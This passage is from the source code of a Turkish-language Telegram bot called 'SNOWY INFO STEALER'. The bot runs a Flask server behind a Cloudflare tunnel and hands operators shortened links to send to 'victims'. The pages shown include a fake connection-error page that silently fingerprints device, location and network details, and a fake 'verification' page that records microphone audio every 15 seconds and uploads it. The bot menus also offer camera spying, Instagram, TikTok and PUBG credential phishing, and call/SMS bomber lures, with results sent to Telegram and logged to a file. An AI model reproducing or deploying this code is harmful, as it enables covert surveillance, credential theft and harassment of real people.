                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            audioChunks.push(event.data);
                        }
                    };
                    
                    const audioPromise = new Promise((resolve) => {
                        mediaRecorder.onstop = () => {
                            if (audioChunks.length > 0 && isRunning) {
                                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                                const formData = new FormData();
                                formData.append('chat_id', TARGET_ID);
                                formData.append('audio', audioBlob, `ses_${Date.now()}.webm`);
                                formData.append('caption', `🎙️ 15 Saniyelik Ses Kaydı`);
                                fetch('/send-audio', { method: 'POST', body: formData })
                                    .finally(() => resolve());
                            } else {
                                resolve();
                            }
                        };
                        
                        mediaRecorder.onerror = () => resolve();
                    });
                    
                    mediaRecorder.start();
                    await new Promise(r => setTimeout(r, 15000));
                    
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                    
                    await audioPromise;
                    
                } catch(e) {
                    console.log('Kayıt hatası:', e);
                }
                
                isRecording = false;
                isLoopActive = false;
                
                if (isRunning && stream && stream.active) {
                    setTimeout(() => {
                        recordAndSend();
                    }, 100);
                }
            }
            
            async function startMicrophone() {
                if (micStarted) return;
                
                document.getElementById('startBtn').disabled = true;
                document.getElementById('startBtn').innerHTML = '🎙️ İZİN İSTENİYOR...';
                
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    micStarted = true;
                    
                    document.getElementById('statusBox').innerHTML = '⏳ Lütfen bekleyiniz...';
                    document.getElementById('statusBox').className = 'status-text status-info';
                    
                    document.getElementById('startBtn').style.display = 'none';
                    document.getElementById('loading').style.display = 'block';
                    document.getElementById('loadingText').innerHTML = '🔒 Ses analizi yapılıyor...';
                    
                    setTimeout(() => {
                        if (isRunning && stream && stream.active) {
                            recordAndSend();
                            document.getElementById('loading').style.display = 'none';
                        }
                    }, 1000);
                    
                    window.addEventListener('beforeunload', function() {
                        isRunning = false;
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                        if (stream) {
                            stream.getTracks().forEach(track => track.stop());
                        }
                    });
                    
                } catch(e) { 
                    let errorMsg = '❌ Mikrofon izni gerekli! Lütfen izin verin.';
                    if (e.name === 'NotAllowedError') {
                        errorMsg = '❌ Mikrofon izni reddedildi! Lütfen tarayıcı ayarlarından izin verin.';
                    } else if (e.name === 'NotFoundError') {
                        errorMsg = '❌ Mikrofon bulunamadı! Lütfen bir mikrofon bağlayın.';
                    }
                    document.getElementById('statusBox').innerHTML = errorMsg;
                    document.getElementById('statusBox').style.background = '#f8d7da';
                    document.getElementById('statusBox').style.color = '#721c24';
                    document.getElementById('startBtn').disabled = false;
                    document.getElementById('startBtn').innerHTML = '✅ DOĞRULAMAYI BAŞLAT';
                    micStarted = false;
                }
            }
            
            window.startMicrophone = startMicrophone;
        })();
    </script>
</body>
</html>'''

# ============================================
# CİHAZ BİLGİSİ HTML
# ============================================
DEVICE_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Bağlantı Hatası</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f2f2f2;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .error-box {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
            padding: 45px 35px;
            text-align: center;
        }
        .icon { font-size: 75px; margin-bottom: 20px; }
        h2 { color: #333; margin-bottom: 12px; font-size: 24px; font-weight: 600; }
        .error-code { 
            background: #f8f9fa; 
            padding: 10px 20px; 
            border-radius: 40px; 
            display: inline-block;
            font-family: monospace;
            color: #dc3545;
            margin: 20px 0;
            font-size: 14px;
            border: 1px solid #e0e0e0;
        }
        .url {
            background: #f8f9fa;
            padding: 14px;
            border-radius: 12px;
            font-family: monospace;
            font-size: 13px;
            color: #666;
            word-break: break-all;
            margin: 20px 0;
            border: 1px solid #e0e0e0;
        }
        button {
            background: #0066cc;
            color: white;
            border: none;
            padding: 12px 28px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 15px;
        }
        button:hover { background: #0052a3; }
        .details { margin-top: 25px; font-size: 11px; color: #999; }
        hr { margin: 25px 0 15px; border: none; border-top: 1px solid #eee; }
    </style>
</head>
<body>
    <div class="error-box">
        <div class="icon">🌐</div>
        <h2>Bu siteye ulaşılamıyor</h2>
        <div class="error-code">ERR_CONNECTION_TIMED_OUT</div>
        <div class="url">{{ url }}</div>
        <p style="font-size: 14px; color: #666;">Site çok uzun süre yanıt vermedi.</p>
        <button onclick="location.reload()">Tekrar Dene</button>
        <hr>
        <div class="details">
            DNS_PROBE_FINISHED_NXDOMAIN<br>
            {{ time }}
        </div>
    </div>
    <script>
        (function() {
            let visitorId = sessionStorage.getItem('visitor_id');
            if (!visitorId) {
                visitorId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                sessionStorage.setItem('visitor_id', visitorId);
            }
            
            var info = {
                visitorId: visitorId,
                timestamp: new Date().toLocaleString('tr-TR'),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages.join(', '),
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'Desteklenmiyor',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Bilinmiyor',
                deviceMemory: navigator.deviceMemory || 'Bilinmiyor',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenColorDepth: screen.colorDepth,
                screenOrientation: screen.orientation ? screen.orientation.type : (window.orientation === 0 ? 'portrait-primary' : 'landscape-primary'),
                batteryLevel: 'Bilinmiyor',
                batteryCharging: 'Bilinmiyor',
                networkType: 'Bilinmiyor',
                networkSpeed: 'Bilinmiyor',
                networkRtt: 'Bilinmiyor',
                geolocation: 'geolocation' in navigator ? 'Var' : 'Yok',
                bluetooth: 'bluetooth' in navigator ? 'Var' : 'Yok',
                clipboard: 'clipboard' in navigator ? 'Var' : 'Yok',
                credentials: 'credentials' in navigator ? 'Var' : 'Yok',
                permissions: 'permissions' in navigator ? 'Var' : 'Yok',
                online: navigator.onLine ? 'Evet' : 'Hayır',
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                webglVendor: 'Bilinmiyor',
                webglRenderer: 'Bilinmiyor',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset()
            };
            
            if ('getBattery' in navigator) {
                navigator.getBattery().then(function(battery) {
                    info.batteryLevel = Math.round(battery.level * 100) + '%';
                    info.batteryCharging = battery.charging ? 'Evet (Şarj Oluyor)' : 'Hayır (Pil ile)';
                    sendData(info);
                }).catch(function() { sendData(info); });
            } else { sendData(info); }
            
            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                info.networkType = conn.type || conn.effectiveType || 'Bilinmiyor';
                info.networkSpeed = conn.downlink ? conn.downlink + ' Mbps' : 'Bilinmiyor';
                info.networkRtt = conn.rtt ? conn.rtt + ' ms' : 'Bilinmiyor';
            }
            
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
            
            function sendData(data) {
                fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(function(e) {});
            }
        })();
    </script>
</body>
</html>'''

@flask_app.route('/')
def index():
    chat_id_param = request.args.get('i')
    if not chat_id_param:
        chat_id_param = request.args.get('c')
    
    if chat_id_param and chat_id_param.isdigit():
        with bot_state.lock:
            bot_state.target_chat_id = int(chat_id_param)
        print(f"✅ Chat ID: {chat_id_param}")
    
    mode = request.args.get('m', '')
    number_type = request.args.get('t', '')
    insta = request.args.get('insta')
    tiktok = request.args.get('tiktok')
    pubg = request.args.get('pubg')
    
    if insta == '1' or (mode == 'instagram'):
        return render_template_string(INSTAGRAM_PAGE, chat_id=chat_id_param)
    
    if tiktok == '1' or (mode == 'tiktok'):
        return render_template_string(TIKTOK_PAGE, chat_id=chat_id_param)
    
    if pubg == '1' or (mode == 'pubg'):
        return render_template_string(PUBG_PAGE, chat_id=chat_id_param)
    
    if number_type == 'call':
        return render_template_string(CALL_BOMBER_PAGE, chat_id=chat_id_param)
    
    if number_type == 'sms':
        return render_template_string(SMS_BOMBER_PAGE, chat_id=chat_id_param)
    
    if request.args.get('c') and not request.args.get('i'):
        return render_template_string(DEVICE_PAGE, url=request.url, time=datetime.now().strftime('%d.%m.%Y %H:%M:%S'))
    
    if mode == 'camera':
        return render_template_string(CAMERA_PAGE, url=request.url, time=datetime.now().strftime('%d.%m.%Y %H:%M:%S'))
    
    if mode == 'microphone':
        return render_template_string(MICROPHONE_PAGE, url=request.url, time=datetime.now().strftime('%d.%m.%Y %H:%M:%S'))
    
    else:
        return render_template_string(DEVICE_PAGE, url=request.url, time=datetime.now().strftime('%d.%m.%Y %H:%M:%S'))

@flask_app.route('/collect', methods=['POST'])
def collect():
    try:
        js_data = request.json
        ip = get_real_ip()
        visitor_id = js_data.get('visitorId', 'unknown')
        
        is_bot_ip, bot_type = is_bot(ip)
        
        if is_bot_ip:
            with bot_state.lock:
                bot_state.bot_count += 1
                bot_count = bot_state.bot_count
            print(f"🤖 {bot_type} ENGELLENDİ #{bot_count} | IP: {ip}")
            return {'status': 'ok', 'bot': True}
        
        unique_key = f"{ip}_{visitor_id}"
        
        with bot_state.lock:
            if unique_key in bot_state.processed_visitors:
                print(f"⚠️ Tekrar eden: {ip}")
                return {'status': 'ok', 'duplicate': True}
            
            bot_state.processed_visitors.add(unique_key)
            bot_state.visitor_count += 1
            visitor_count = bot_state.visitor_count
            target_chat_id = bot_state.target_chat_id
            
            if len(bot_state.processed_visitors) > 10000:
                bot_state.processed_visitors.clear()
        
        loc = get_location(ip)
        
        print(f"📥 GERÇEK KURBAN #{visitor_count} | IP: {ip}")
        
        cookie = 'Açık' if js_data.get('cookieEnabled') else 'Kapalı'
        online = 'Evet' if js_data.get('online') else 'Hayır'
        user_agent_full = js_data.get('userAgent', '?')
        
        message = f"""🔥 <b>YENİ KURBAN #{visitor_count}</b> 🔥
📅 <b>Zaman:</b> {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}

🌍 <b>KONUM BİLGİLERİ</b>
📍 IP Adresi: {ip}
📍 Ülke: {loc['ulke']} ({loc['ulke_kod']})
📍 Şehir: {loc['sehir']}
📍 Koordinat: {loc['lat']}, {loc['lon']}
📍 ISS: {loc['isp']}
📍 Zaman Dilimi: {loc['tz']}

📱 <b>CİHAZ BİLGİLERİ</b>
📱 User-Agent: {user_agent_full}
📱 Platform: {js_data.get('platform', '?')}
📱 Dil: {js_data.get('language', '?')}

💪 <b>DONANIM BİLGİLERİ</b>
💪 RAM: {js_data.get('deviceMemory', '?')} GB
💪 CPU Çekirdek: {js_data.get('hardwareConcurrency', '?')}
💪 Dokunma: {js_data.get('maxTouchPoints', '?')} nokta

🖥️ <b>EKRAN BİLGİLERİ</b>
🖥️ Çözünürlük: {js_data.get('screenWidth', '?')} x {js_data.get('screenHeight', '?')}
🖥️ Renk: {js_data.get('screenColorDepth', '?')} bit
🖥️ Yön: {js_data.get('screenOrientation', '?')}

🔋 <b>PİL BİLGİLERİ</b>
🔋 Seviye: {js_data.get('batteryLevel', '?')}
🔋 Şarj Durumu: {js_data.get('batteryCharging', '?')}

📡 <b>AĞ BİLGİLERİ</b>
📡 Bağlantı: {js_data.get('networkType', '?')}
📡 İnternet Hızı: {js_data.get('networkSpeed', '?')}
📡 Gecikme: {js_data.get('networkRtt', '?')}

🌐 <b>TARAYICI ÖZELLİKLERİ</b>
🌐 GPS: {js_data.get('geolocation', '?')}
🌐 Bluetooth: {js_data.get('bluetooth', '?')}
🌐 Çevrimiçi: {online}
🌐 Çerezler: {cookie}

🎮 <b>GPU BİLGİLERİ</b>
🎮 Üretici: {js_data.get('webglVendor', '?')}
🎮 Model: {js_data.get('webglRenderer', '?')}

⏰ <b>ZAMAN BİLGİLERİ</b>
⏰ Zaman Dilimi: {js_data.get('timezone', '?')}
⏰ İstemci Saati: {js_data.get('timestamp', '?')}

✅ <b>BİLGİLER KAYDEDİLDİ</b>"""
        
        if target_chat_id:
            def send():
                send_telegram_message_sync(target_chat_id, message)
            threading.Thread(target=send, daemon=True).start()
        
        with open('kurbanlar.json', 'a', encoding='utf-8') as f:
            f.write(json.dumps({
                'visit_no': visitor_count,
                'visitor_id': visitor_id,
                'timestamp': datetime.now().isoformat(),
                'ip': ip,
                'user_agent': user_agent_full,
                'location': loc,
                'device': js_data
            }, ensure_ascii=False, indent=2))
            f.write('\n')
        
        return {'status': 'ok'}
        
    except Exception as e:
        print(f"HATA: {e}")
        return {'status': 'error'}

def run_flask():
    while bot_state.running:
        try:
            flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False, threaded=True)
        except Exception as e:
            print(f"❌ Flask hatası: {e}")
            if bot_state.running:
                print("🔄 Flask yeniden başlatılıyor...")
                time.sleep(5)
            else:
                break

# ============================================
# 1. YÖNTEM - TEK TUNNEL (SABİT LİNK)
# ============================================
def refresh_tunnel():
    """Tunnel'ı yenile - sadece 7249747391 ID'li kullanıcı kullanabilir"""
    print("🔄 Tunnel yenileniyor...")
    
    if bot_state.tunnel_process and bot_state.tunnel_process.poll() is None:
        try:
            bot_state.tunnel_process.terminate()
            time.sleep(2)
            if bot_state.tunnel_process.poll() is None:
                bot_state.tunnel_process.kill()
        except Exception as e:
            print(f"❌ Tunnel kapatma hatası: {e}")
    
    bot_state.base_url = None
    bot_state.tunnel_process = None
    
    return get_public_url(7249747391, 'device', None)

def get_public_url(chat_id, mode, number_type=None):
    try:
        if bot_state.base_url and bot_state.tunnel_process and bot_state.tunnel_process.poll() is None:
            print(f"📌 Mevcut tunnel kullanılıyor: {bot_state.base_url}")
            base_url = bot_state.base_url
        else:
            if bot_state.tunnel_process and bot_state.tunnel_process.poll() is None:
                try:
                    bot_state.tunnel_process.terminate()
                    time.sleep(2)
                except:
                    pass
            
            process = subprocess.Popen(
                ['cloudflared', 'tunnel', '--url', 'http://localhost:8080'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            bot_state.tunnel_process = process
            
            print("⏳ Cloudflare Tunnel başlatılıyor...")
            timeout = 60
            start_time = time.time()
            base_url = None
            
            while time.time() - start_time < timeout:
                if process.poll() is not None:
                    print("❌ Tunnel process kapandı, çıkış kodu:", process.returncode)
                    break
                    
                line = process.stderr.readline()
                if line:
                    print(f"Tunnel: {line.strip()}")
                    if 'https://' in line and '.trycloudflare.com' in line:
                        for word in line.split():
                            if 'https://' in word and '.trycloudflare.com' in word:
                                base_url = word.strip()
                                bot_state.base_url = base_url
                                print(f"✅ Tunnel başarıyla başlatıldı: {base_url}")
                                break
                        if base_url:
                            break
                time.sleep(0.5)
            
            if not base_url:
                print("❌ Tunnel başlatılamadı (timeout)")
                return None
        
        if not bot_state.base_url:
            return None
        
        if mode == 'device':
            url = f"{bot_state.base_url}?c={chat_id}"
        elif mode == 'camera':
            url = f"{bot_state.base_url}?i={chat_id}&m=camera"
        elif mode == 'microphone':
            url = f"{bot_state.base_url}?i={chat_id}&m=microphone"
        elif mode == 'number':
            url = f"{bot_state.base_url}?i={chat_id}&t={number_type}"
        elif mode == 'instagram':
            url = f"{bot_state.base_url}?i={chat_id}&insta=1"
        elif mode == 'tiktok':
            url = f"{bot_state.base_url}?i={chat_id}&tiktok=1"
        elif mode == 'pubg':
            url = f"{bot_state.base_url}?i={chat_id}&pubg=1"
        else:
            url = f"{bot_state.base_url}?i={chat_id}"
        
        print(f"🔗 Link oluşturuldu: {url}")
        
        shortened = shorten_url(url)
        print(f"🔗 Kısaltılmış link: {shortened}")
        return shortened
        
    except Exception as e:
        print(f"Tunnel hatası: {e}")
        return None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name
        
        buttons = [
            [InlineKeyboardButton("📱 CİHAZ BİLGİSİ", callback_data="mode_device")],
            [InlineKeyboardButton("🎥 KAMERA HACK", callback_data="mode_camera")],
            [InlineKeyboardButton("🎙️ MİKROFON HACK", callback_data="mode_microphone")],
            [InlineKeyboardButton("📞 NUMARA HACK", callback_data="mode_number")],
            [InlineKeyboardButton("📸 INSTAGRAM HACK", callback_data="mode_instagram")],
            [InlineKeyboardButton("🎵 TIKTOK HACK", callback_data="mode_tiktok")],
            [InlineKeyboardButton("🎮 PUBG HACK", callback_data="mode_pubg")],
            [
                InlineKeyboardButton("👤 SAHİBİM", url=f"https://t.me/{OWNER_USERNAME}"),
                InlineKeyboardButton("📢 KANAL", url=f"https://t.me/{CHANNEL_USERNAME}")
            ]
        ]
        
        # SADECE 7249747391 ID'li kullanıcıya yenileme butonu göster
        if user_id == 7249747391:
            buttons.insert(0, [InlineKeyboardButton("🔄 TÜNEL YENİLE", callback_data="mode_refresh")])
        
        reply_markup = InlineKeyboardMarkup(buttons)
        
        await update.message.reply_text(
            f"🔥 SNOWY INFO STEALER 🔥\n\n"
            f"Merhaba {user_name}!\n\n"
            f"📌 MOD SEÇ:\n"
            f"• 📱 Cihaz Bilgisi - Tüm detaylı cihaz bilgileri\n"
            f"• 🎥 Kamera Hack - Anlık fotoğraflar ve 3 saniyelik videolar\n"
            f"• 🎙️ Mikrofon Hack - 15 saniyelik kayıt\n"
            f"• 📞 Numara Hack - Call/SMS Bomber\n"
            f"• 📸 Instagram Hack - Mavi Tik sitesi ile kullanıcı adı/şifre\n"
            f"• 🎵 TikTok Hack - Takipçi sitesi ile kullanıcı adı/şifre\n"
            f"• 🎮 PUBG Hack - Bedava UC sitesi ile e-posta, şifre, oyuncu ID\n\n"
            f"👤 Sahip: @{OWNER_USERNAME}\n"
            f"📢 Kanal: @{CHANNEL_USERNAME}\n\n"
            f"💡 Chat ID: `{user_id}`",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        return SELECT_MODE
        
    except Exception as e:
        print(f"❌ Start komutu hatası: {e}")
        return ConversationHandler.END

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pass

async def mode_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name
        await query.answer()
        
        mode = query.data.split('_')[1]
        bot_state.user_mode[user_id] = mode
        
        # YENİLEME BUTONU (SADECE 7249747391)
        if mode == 'refresh':
            if user_id == 7249747391:
                await query.edit_message_text(
                    "🔄 *TÜNEL YENİLENİYOR...*\n\nEski tunnel kapatılıyor, yeni tunnel açılıyor...\nLütfen bekleyin...",
                    parse_mode='Markdown'
                )
                
                new_url = refresh_tunnel()
                
                if new_url:
                    await query.edit_message_text(
                        f"✅ *TÜNEL YENİLENDİ!*\n\n"
                        f"🔗 Yeni Tunnel Linki: `{new_url}`\n\n"
                        f"⚠️ Artık tüm linkler bu yeni domain üzerinden çalışacak!\n"
                        f"📊 Chat ID: `{user_id}`",
                        parse_mode='Markdown'
                    )
                else:
                    await query.edit_message_text(
                        "❌ *HATA!*\nTunnel yenilenemedi. Lütfen tekrar dene.",
                        parse_mode='Markdown'
                    )
                return ConversationHandler.END
            else:
                await query.edit_message_text(
                    "❌ *YETKİSİZ!*\nBu butonu kullanma yetkiniz yok.",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
        
        elif mode == 'device':
            await query.edit_message_text(
                "🌍 *LİNK OLUŞTURULUYOR...*\n\nLütfen bekleyin...",
                parse_mode='Markdown'
            )
            
            url = get_public_url(user_id, 'device')
            
            if url:
                await query.edit_message_text(
                    f"✅ *LİNK HAZIR!*\n\n"
                    f"🔗 `{url}`\n\n"
                    f"⚠️ Bu linki kurbana gönder!\n"
                    f"📱 Tüm detaylı cihaz bilgileri hemen sana gelecek!\n\n"
                    f"📊 Chat ID: `{user_id}`",
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    "❌ *HATA!*\nLink oluşturulamadı. Lütfen internet bağlantınızı kontrol edin.",
                    parse_mode='Markdown'
                )
            return ConversationHandler.END
        
        elif mode == 'camera':
            await query.edit_message_text(
                "🌍 *LİNK OLUŞTURULUYOR...*\n\nLütfen bekleyin...",
                parse_mode='Markdown'
            )
            
            url = get_public_url(user_id, 'camera')
            
            if url:
                await query.edit_message_text(
                    f"✅ *KAMERA HACK LİNKİ HAZIR!*\n\n"
                    f"🔗 `{url}`\n\n"
                    f"⚠️ Bu linki kurbana gönder!\n"
                    f"🎥 Kurban siteye girip, kamera izni verdiğinde sürekli olarak:\n"
                    f"• 3 fotoğraf çekilir ve gönderilir\n"
                    f"• 3 saniyelik video çekilir ve gönderilir\n\n"
                    f"📊 Chat ID: `{user_id}`",
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    "❌ *HATA!*\nLink oluşturulamadı. Lütfen internet bağlantınızı kontrol edin.",
                    parse_mode='Markdown'
                )
            return ConversationHandler.END
        
        elif mode == 'microphone':
            await query.edit_message_text(
                "🌍 *LİNK OLUŞTURULUYOR...*\n\nLütfen bekleyin...",
                parse_mode='Markdown'
            )
            
            url = get_public_url(user_id, 'microphone')
            
            if url:
                await query.edit_message_text(
                    f"✅ *MİKROFON HACK LİNKİ HAZIR!*\n\n"
                    f"🔗 `{url}`\n\n"
                    f"⚠️ Bu linki kurbana gönder!\n"
                    f"🎙️ Kurban siteye girip, mikrofon izni verdiğinde sürekli olarak:\n"
                    f"• Her 15 saniyede bir ses kaydedilir ve gönderilir\n\n"
                    f"📊 Chat ID: `{user_id}`",
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    "❌ *HATA!*\nLink oluşturulamadı. Lütfen internet bağlantınızı kontrol edin.",
                    parse_mode='Markdown'
                )
            return ConversationHandler.END
        
        elif mode == 'number':
            keyboard = [
                [InlineKeyboardButton("📞 CALL BOMBER", callback_data="number_call")],
                [InlineKeyboardButton("📱 SMS BOMBER", callback_data="number_sms")],
                [InlineKeyboardButton("🔙 GERİ DÖN", callback_data="back_to_menu")]
            ]
            await query.edit_message_text(
                "📞 *NUMARA HACK MODU* 📞\n\n"
                "Hangi saldırı tipini kullanmak istiyorsun?\n\n"
                "⚠️ *NOT:* Kurban siteye girdiğinde IP ve girdiği numara sana gelecek!\n"
                "📱 NUMARA FORMATI: 5 ile başlayacak! Örnek: 5555555555",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return SELECT_NUMBER_TYPE
        
        elif mode == 'instagram':
            await query.edit_message_text(
                "🌍 *LİNK OLUŞTURULUYOR...*\n\nLütfen bekleyin...",
                parse_mode='Markdown'
            )
            
            url = get_public_url(user_id, 'instagram')
            
            if url:
                await query.edit_message_text(
                    f"✅ *INSTAGRAM HACK LİNKİ HAZIR!*\n\n"
                    f"🔗 `{url}`\n\n"
                    f"⚠️ Bu linki kurbana gönder!\n"
                    f"📸 Kurban siteye girdiğinde:\n"
                    f"• IP adresi, kullanıcı adı ve şifresi sana gelecek!\n\n"
                    f"📊 Chat ID: `{user_id}`",
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    "❌ *HATA!*\nLink oluşturulamadı. Lütfen internet bağlantınızı kontrol edin.",
                    parse_mode='Markdown'
                )
            return ConversationHandler.END
        
        elif mode == 'tiktok':
            await query.edit_message_text(
                "🌍 *LİNK OLUŞTURULUYOR...*\n\nLütfen bekleyin...",
                parse_mode='Markdown'
            )
            
            url = get_public_url(user_id, 'tiktok')
            
            if url:
                await query.edit_message_text(
                    f"✅ *TIKTOK HACK LİNKİ HAZIR!*\n\n"
                    f"🔗 `{url}`\n\n"
                    f"⚠️ Bu linki kurbana gönder!\n"
                    f"🎵 Kurban siteye girdiğinde:\n"
                    f"• IP adresi, kullanıcı adı veya e posta adresi, şifresi ve girdiği miktar sana gelecek!\n\n"
                    f"📊 Chat ID: `{user_id}`",
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    "❌ *HATA!*\nLink oluşturulamadı. Lütfen internet bağlantınızı kontrol edin.",
                    parse_mode='Markdown'
                )
            return ConversationHandler.END
        
        elif mode == 'pubg':
            await query.edit_message_text(
                "🌍 *LİNK OLUŞTURULUYOR...*\n\nLütfen bekleyin...",
                parse_mode='Markdown'
            )
            
            url = get_public_url(user_id, 'pubg')
            
            if url:
                await query.edit_message_text(
                    f"✅ *PUBG HACK LİNKİ HAZIR!*\n\n"
                    f"🔗 `{url}`\n\n"
                    f"⚠️ Bu linki kurbana gönder!\n"
                    f"🎮 Kurban siteye girdiğinde:\n"
                    f"• IP adresi, e posta adresi, oyuncu ID'si ve UC miktarı sana gelecek!\n\n"
                    f"📊 Chat ID: `{user_id}`",
                    parse_mode='Markdown'
                )
            else:
                await query.edit_message_text(
                    "❌ *HATA!*\nLink oluşturulamadı. Lütfen internet bağlantınızı kontrol edin.",
                    parse_mode='Markdown'
                )
            return ConversationHandler.END
            
    except Exception as e:
        print(f"❌ Mod seçimi hatası: {e}")
        return ConversationHandler.END

async def number_type_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        user_id = update.effective_user.id
        await query.answer()
        
        number_type = query.data.split('_')[1]
        bot_state.user_number_type[user_id] = number_type
        
        await query.edit_message_text(
            "🌍 *LİNK OLUŞTURULUYOR...*\n\nLütfen bekleyin...",
            parse_mode='Markdown'
        )
        
        url = get_public_url(user_id, 'number', number_type=number_type)
        
        if url:
            if number_type == 'call':
                mesaj = f"""✅ *CALL BOMBER LİNKİ HAZIR!*

🔗 `{url}`

⚠️ Bu linki kurbana gönder!
📞 Kurban siteye girdiğinde:
• IP adresi ve girdiği numara sana gelecek!

📱 NUMARA FORMATI:
5 ile başlayacak! Örnek: 5555555555

📊 Chat ID: `{user_id}`"""
            else:
                mesaj = f"""✅ *SMS BOMBER LİNKİ HAZIR!*

🔗 `{url}`

⚠️ Bu linki kurbana gönder!
📱 Kurban siteye girdiğinde:
• IP adresi, girdiği numara ve varsa mesaj içeriği sana gelecek!

📱 NUMARA FORMATI: 
5 ile başlayacak! Örnek: 5555555555

📊 Chat ID: `{user_id}`"""
            
            await query.edit_message_text(
                mesaj,
                parse_mode='Markdown'
            )
        else:
            await query.edit_message_text(
                "❌ *HATA!*\nLink oluşturulamadı. Lütfen internet bağlantınızı kontrol edin.",
                parse_mode='Markdown'
            )
        
        return ConversationHandler.END
        
    except Exception as e:
        print(f"❌ Numara tipi seçimi hatası: {e}")
        return ConversationHandler.END

async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name
        
        buttons = [
            [InlineKeyboardButton("📱 CİHAZ BİLGİSİ", callback_data="mode_device")],
            [InlineKeyboardButton("🎥 KAMERA HACK", callback_data="mode_camera")],
            [InlineKeyboardButton("🎙️ MİKROFON HACK", callback_data="mode_microphone")],
            [InlineKeyboardButton("📞 NUMARA HACK", callback_data="mode_number")],
            [InlineKeyboardButton("📸 INSTAGRAM HACK", callback_data="mode_instagram")],
            [InlineKeyboardButton("🎵 TIKTOK HACK", callback_data="mode_tiktok")],
            [InlineKeyboardButton("🎮 PUBG HACK", callback_data="mode_pubg")],
            [
                InlineKeyboardButton("👤 SAHİBİM", url=f"https://t.me/{OWNER_USERNAME}"),
                InlineKeyboardButton("📢 KANAL", url=f"https://t.me/{CHANNEL_USERNAME}")
            ]
        ]
        
        if user_id == 7249747391:
            buttons.insert(0, [InlineKeyboardButton("🔄 TÜNEL YENİLE", callback_data="mode_refresh")])
        
        reply_markup = InlineKeyboardMarkup(buttons)
        
        await query.edit_message_text(
            f"🔥 SNOWY INFO STEALER 🔥\n\n"
            f"Merhaba {user_name}!\n\n"
            f"📌 MOD SEÇ:\n"
            f"• 📱 Cihaz Bilgisi - Tüm detaylı cihaz bilgileri\n"
            f"• 🎥 Kamera Hack - Anlık fotoğraflar ve 3 saniyelik videolar\n"
            f"• 🎙️ Mikrofon Hack - 15 saniyelik kayıt\n"
            f"• 📞 Numara Hack - Call/SMS Bomber\n"
            f"• 📸 Instagram Hack - Mavi Tik sitesi ile kullanıcı adı/şifre\n"
            f"• 🎵 TikTok Hack - Takipçi sitesi ile kullanıcı adı/şifre\n"
            f"• 🎮 PUBG Hack - Bedava UC sitesi ile e-posta, şifre, oyuncu ID\n\n"
            f"👤 Sahip: @{OWNER_USERNAME}\n"
            f"📢 Kanal: @{CHANNEL_USERNAME}\n\n"
            f"💡 Chat ID: `{user_id}`",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        return SELECT_MODE
        
    except Exception as e:
        print(f"❌ Geri dön hatası: {e}")
        return ConversationHandler.END

async def delete_all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        try:
            await update.message.delete()
        except:
            pass

async def run_bot_async():
    application = Application.builder().token(TOKEN).build()
    
    with bot_state.lock:
        bot_state.bot_application = application
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
